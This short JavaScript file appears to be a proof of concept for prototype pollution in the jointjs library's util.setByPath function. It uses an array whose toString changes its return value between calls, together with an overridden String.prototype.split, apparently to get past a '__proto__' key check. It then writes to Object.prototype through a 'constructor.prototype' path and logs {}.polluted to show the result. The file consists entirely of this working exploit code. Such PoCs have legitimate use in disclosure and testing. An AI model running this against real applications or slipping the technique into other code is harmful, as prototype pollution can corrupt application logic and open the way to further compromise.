var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
console.log({}.polluted);
const jointjs = require('jointjs');
jointjs.util.setByPath({}, [
    ['constructor.prototype'],
    'polluted'
], 'yes');
console.log({}.polluted);